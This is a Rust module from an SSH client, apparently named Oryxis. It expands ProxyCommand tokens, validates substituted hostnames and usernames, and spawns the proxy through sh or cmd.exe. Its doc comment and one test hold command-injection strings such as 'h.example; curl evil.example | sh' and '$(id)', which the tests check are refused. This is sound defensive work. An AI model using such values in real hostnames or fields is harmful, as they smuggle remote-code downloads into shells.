//! Turning a stored `ProxyCommand` line into a running local process.
//!
//! Two things live here that `proxy_command` used to do inline, and got
//! wrong in the same way on the same platform:
//!
//! 1. **Token expansion.** OpenSSH resolves `%h` / `%p` / `%r` against
//!    the host being dialed before it hands the line to a shell. Oryxis
//!    did not, so an imported `~/.ssh/config` entry, whose ProxyCommand
//!    almost always carries those tokens, reached the shell with the
//!    literal text `%h` where the target belonged. Nothing downstream
//!    could recover from that: `aws ssm start-session --target %h` asks
//!    SSM for an instance named `%h`.
//!
//! 2. **The shell.** `sh -c` is the Unix spelling and only that. A
//!    stock Windows box has no `sh` anywhere on `PATH`, so every command
//!    proxy on Windows died in `CreateProcess` before the line was even
//!    parsed. `cmd.exe` is the local equivalent (and what Win32-OpenSSH
//!    reaches for), with the quoting rule below to get a line through it
//!    intact.
//!
//! Expansion happens AFTER the approval gate in `proxy_command`, never
//! before: what the user approved, and what `proxy_command_fingerprint`
//! hashes, is the stored line with its tokens still in it. Substituting
//! first would mint a new fingerprint per target and re-prompt on every
//! host that shares one proxy identity.
//!
//! That ordering is also why the values that go in are checked rather
//! than trusted. The line is approved once; the hostname it is expanded
//! with arrives per dial, and a sync peer writes hostnames verbatim. A
//! host of `x; curl evil.sh | sh` would otherwise turn one approval into
//! a different process every time the peer edited the host. So a
//! substituted value may only be the shape of a host or a login name,
//! and a dial carrying anything else stops here instead of reaching a
//! shell.

use std::process::Stdio;

use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::{Child, Command as TokioCommand};

use super::SshError;

/// What `%h`, `%p` and `%r` resolve to for one dial.
pub(crate) struct ProxyTokens<'a> {
    pub host: &'a str,
    pub port: u16,
    /// `None` when the connection names no user; only `%r` needs it, so
    /// a line without that token still expands.
    pub user: Option<&'a str>,
}

/// Everything a substituted value is allowed to contain.
///
/// The set is the union of what a host can be (DNS labels, IPv4, a
/// bracketed IPv6 literal, an EC2 instance id) and what a login name can
/// be (including the `DOMAIN\user` and `user@realm` spellings), and
/// deliberately nothing else. No character in it is a word separator, a
/// quote, or an operator in `sh` or in `cmd.exe`, so a value that passes
/// cannot change the structure of the line it lands in, only fill a slot
/// in it.
fn is_substitutable(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 255
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '.' | '-' | '_' | ':' | '[' | ']' | '@' | '/' | '\\' | '+')
        })
}

fn checked<'a>(token: &str, value: &'a str) -> Result<&'a str, SshError> {
    if is_substitutable(value) {
        Ok(value)
    } else {
        // The value is echoed because it is the connection's own
        // hostname or username, which the host editor already shows in
        // the clear; the command line, which may not be, still is not.
        Err(SshError::Proxy(format!(
            "ProxyCommand {token} refused: {value:?} is not a plain host or user name"
        )))
    }
}

/// Resolve OpenSSH's ProxyCommand tokens against `tokens`.
///
/// `%%` is a literal `%`. Any other `%x` is left exactly as written:
/// Oryxis implements the three tokens that name the dial, and a Windows
/// line referring to `%USERPROFILE%` or `%ComSpec%` must reach `cmd.exe`
/// with its environment references intact.
pub(crate) fn expand_proxy_tokens(
    cmd: &str,
    tokens: &ProxyTokens<'_>,
) -> Result<String, SshError> {
    if !cmd.contains('%') {
        return Ok(cmd.to_string());
    }
    let port = tokens.port.to_string();
    let mut out = String::with_capacity(cmd.len() + 16);
    let mut chars = cmd.chars();
    while let Some(c) = chars.next() {
        if c != '%' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('%') => out.push('%'),
            Some('h') => out.push_str(checked("%h", tokens.host)?),
            Some('p') => out.push_str(&port),
            Some('r') => {
                let user = tokens.user.ok_or_else(|| {
                    SshError::Proxy("ProxyCommand uses %r but this host has no username".into())
                })?;
                out.push_str(checked("%r", user)?);
            }
            Some(other) => {
                out.push('%');
                out.push(other);
            }
            // A line ending in a bare `%` is not a token; keep it.
            None => out.push('%'),
        }
    }
    Ok(out)
}

/// The local shell, holding an already-expanded line.
#[cfg(unix)]
fn shell_command(line: &str) -> TokioCommand {
    let mut cmd = TokioCommand::new("sh");
    cmd.arg("-c").arg(line);
    cmd
}

/// The local shell, holding an already-expanded line.
///
/// `cmd.exe` has two rules for the text after `/C`, and picks between
/// them by counting quotes: a line with one quoted argument keeps its
/// quotes, a line with more than one gets its first and last quote
/// stripped. A ProxyCommand routinely has both an interpreter path in
/// `Program Files` and a quoted parameter, which lands it in the second
/// rule and mangles it. `/S` settles the question: it forces the
/// strip-the-outer-pair rule always, so wrapping the whole line in one
/// added pair delivers it verbatim no matter what is inside.
///
/// It has to go through `raw_arg`. Rust quotes a normal `arg` for the
/// MSVC runtime's parser, which `cmd.exe` does not use, and the escaping
/// it adds is what the shell would then choke on.
#[cfg(windows)]
fn shell_command(line: &str) -> TokioCommand {
    use std::os::windows::process::CommandExt;

    // Oryxis is a GUI process, so a `cmd.exe` child would otherwise
    // flash a console window on every dial through a command proxy.
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let comspec = std::env::var("ComSpec").unwrap_or_else(|_| "cmd.exe".to_string());
    let mut cmd = TokioCommand::new(comspec);
    cmd.as_std_mut().raw_arg(format!("/S /C \"{line}\""));
    cmd.creation_flags(CREATE_NO_WINDOW);
    cmd
}

/// Spawn an expanded proxy line with its three pipes wired.
///
/// The child is deliberately not `kill_on_drop`: `proxy_command` keeps
/// the pipes and lets the `Child` go, and the proxy ends when the SSH
/// session drops its end of stdin.
pub(crate) fn spawn_proxy_process(line: &str) -> std::io::Result<Child> {
    let mut cmd = shell_command(line);
    cmd.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        // Piped, not null. A command proxy fails for ordinary reasons,
        // an expired SSO token, a binary that moved, a region that does
        // not host the target, and it says so on stderr. Discarding that
        // left the user with an unexplained EOF during version exchange
        // and nothing in the log to explain it.
        .stderr(Stdio::piped());
    cmd.spawn()
}

/// Copy a command proxy's own diagnostics into the log.
///
/// Capped at 32 lines so a proxy that chatters (a progress meter, a
/// retry loop) cannot fill the log file, and run as its own task so a
/// silent proxy costs nothing but a parked read.
pub(crate) async fn log_proxy_stderr(
    stderr: tokio::process::ChildStderr,
    host: String,
    port: u16,
) {
    const MAX_LINES: usize = 32;
    let mut lines = BufReader::new(stderr).lines();
    let mut budget = MAX_LINES;
    while budget > 0 {
        match lines.next_line().await {
            Ok(Some(line)) => {
                if line.trim().is_empty() {
                    continue;
                }
                budget -= 1;
                tracing::warn!(
                    target: "oryxis::ssh::proxy",
                    %host,
                    port,
                    "command proxy: {}",
                    line
                );
            }
            // EOF, or the pipe died with the proxy. Either way there is
            // nothing further to say.
            _ => break,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tokens<'a>(host: &'a str, port: u16, user: Option<&'a str>) -> ProxyTokens<'a> {
        ProxyTokens { host, port, user }
    }

    #[test]
    fn the_ssm_line_from_ssh_config_expands() {
        // Verbatim shape of the AWS-documented ProxyCommand, which is
        // the case that sent this module into existence.
        let line = "aws ssm start-session --target %h \
                    --document-name AWS-StartSSHSession --parameters portNumber=%p";
        let out = expand_proxy_tokens(line, &tokens("i-00cfa8b4282a0b658", 22, None)).unwrap();
        assert_eq!(
            out,
            "aws ssm start-session --target i-00cfa8b4282a0b658 \
             --document-name AWS-StartSSHSession --parameters portNumber=22"
        );
    }

    #[test]
    fn host_port_and_user_all_resolve() {
        let out = expand_proxy_tokens(
            "ssh -l %r -W %h:%p bastion",
            &tokens("db.internal", 2222, Some("deploy")),
        )
        .unwrap();
        assert_eq!(out, "ssh -l deploy -W db.internal:2222 bastion");
    }

    #[test]
    fn a_doubled_percent_is_one_literal_percent() {
        let out =
            expand_proxy_tokens("run --pct 50%% --to %h", &tokens("h.example", 22, None)).unwrap();
        assert_eq!(out, "run --pct 50% --to h.example");
    }

    #[test]
    fn an_unknown_token_survives_untouched() {
        // A Windows line has environment references in it and they are
        // the shell's business, not ours.
        let out =
            expand_proxy_tokens("%ComSpec% /c helper %h", &tokens("h.example", 22, None)).unwrap();
        assert_eq!(out, "%ComSpec% /c helper h.example");
    }

    #[test]
    fn a_line_without_tokens_is_returned_as_written() {
        let line = "cloudflared access ssh --hostname fixed.example";
        assert_eq!(
            expand_proxy_tokens(line, &tokens("h", 22, None)).unwrap(),
            line
        );
    }

    #[test]
    fn a_bracketed_ipv6_literal_is_a_host() {
        let out = expand_proxy_tokens("nc %h %p", &tokens("[2001:db8::1]", 22, None)).unwrap();
        assert_eq!(out, "nc [2001:db8::1] 22");
    }

    #[test]
    fn a_hostname_that_could_run_a_command_is_refused() {
        // The approval covers the line, not the host it is expanded
        // with, so this is the one that has to fail closed.
        for hostile in [
            "h.example; curl evil.example | sh",
            "h.example`id`",
            "h.example$(id)",
            "h.example&calc",
            "h example",
            "h.example\"",
        ] {
            let err = expand_proxy_tokens("nc %h %p", &tokens(hostile, 22, None)).unwrap_err();
            assert!(
                matches!(err, SshError::Proxy(_)),
                "expected a refusal for {hostile:?}, got {err:?}"
            );
        }
    }

    #[test]
    fn a_username_that_could_run_a_command_is_refused() {
        let err = expand_proxy_tokens("ssh -l %r bastion", &tokens("h.example", 22, Some("a;id")))
            .unwrap_err();
        assert!(matches!(err, SshError::Proxy(_)));
    }

    #[test]
    fn percent_r_without_a_username_is_an_error_not_an_empty_slot() {
        // Silently expanding to "" would hand the proxy a flag with no
        // value and fail somewhere far less legible.
        let err =
            expand_proxy_tokens("ssh -l %r bastion", &tokens("h.example", 22, None)).unwrap_err();
        assert!(matches!(err, SshError::Proxy(_)));
    }

    #[tokio::test]
    async fn the_local_shell_runs_a_line_and_hands_back_its_output() {
        // The platform half: whatever `shell_command` picked has to
        // actually exist and actually run the line. This is the
        // assertion that was missing on Windows, where `sh` never did.
        use tokio::io::AsyncReadExt;

        let mut child = spawn_proxy_process("echo oryxis-proxy-ok").expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(
            out.contains("oryxis-proxy-ok"),
            "shell did not run the line, got {out:?}"
        );
    }

    #[tokio::test]
    async fn a_quoted_interpreter_path_with_spaces_survives_the_shell() {
        // The Windows quoting rule this module exists to get right: a
        // line with more than one quoted run used to come out of
        // `cmd.exe` with its first and last quote gone.
        #[cfg(windows)]
        let line = r#""C:\Windows\System32\cmd.exe" /c echo "a b" c"#;
        #[cfg(unix)]
        let line = r#"/bin/echo "a b" c"#;

        use tokio::io::AsyncReadExt;
        let mut child = spawn_proxy_process(line).expect("proxy spawn");
        let mut out = String::new();
        child
            .stdout
            .take()
            .expect("stdout")
            .read_to_string(&mut out)
            .await
            .expect("read");
        assert!(out.contains("a b"), "quoting was mangled, got {out:?}");
    }
}
